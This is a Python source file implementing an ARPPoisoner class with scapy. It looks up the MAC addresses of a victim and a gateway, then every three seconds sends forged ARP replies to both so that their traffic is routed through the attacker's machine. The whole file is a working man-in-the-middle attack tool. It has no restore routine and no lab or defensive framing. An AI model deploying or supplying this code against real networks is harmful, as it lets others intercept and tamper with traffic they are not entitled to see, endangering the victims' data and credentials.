import scapy.all as sc;
from scapy.layers.l2 import ARP;
import time;
import threading;

class ARPPoisoner:
    def __init__(self, interface, victim_ip, gateway_ip, attacker_mac, logger):
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_mac = attacker_mac
        self.logger = logger

    # Get mac adress of a given IP adress
    def get_mac(self, ip):
        arp = sc.ARP(pdst=ip)
        broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp
        answered = sc.srp(packet, timeout=2, verbose=False, iface=self.interface)[0]
        for _, received in answered:
            return received.hwsrc
        return None

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self.start_loop)
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        self.running = False

        
        if self.thread:
            self.thread.join(timeout=10)

    def start_loop(self):
        # Re-poison the ARP table every 3 seconds.
        while self.running:
            self.arp_poisoning_loop()
            time.sleep(3)

    # Do the poisoning
    def arp_poisoning_loop(self):
        def log(msg):
            if self.logger:
                self.logger(msg)
            else:
                print(msg)

        try:
            victim_mac = self.get_mac(self.victim_ip)

            if not victim_mac:
                log("Failed getting victim mac")
                return
            
            gateway_mac = self.get_mac(self.gateway_ip)

            if not gateway_mac:
                log("Failed getting gateway mac")
                return

            # Tell the victim that we are the gateway.
            victim_arp_poison = ARP(
                op=2,  # ARP reply
                pdst=self.victim_ip,  # Destination is the victim
                hwdst=victim_mac,
                psrc=self.gateway_ip,  # Source is the gateway (we claim that)
                hwsrc=self.attacker_mac  # But actually we send our own MAC address.
            )

            # Same for the gateway
            gateway_arp_poison = ARP(
                op=2,  # ARP reply
                pdst=self.gateway_ip,  # Destination is the gateway
                hwdst=gateway_mac,
                psrc=self.victim_ip,  # Source is the victim (we claim that)
                hwsrc=self.attacker_mac  # But actually we send our own MAC address
            )

            # Send the poisoned packets
            sc.send(victim_arp_poison, verbose=0, iface=self.interface)
            sc.send(gateway_arp_poison, verbose=0, iface=self.interface)

        except Exception as e:
            log(f"Error during ARP poisoning: {e}")
    
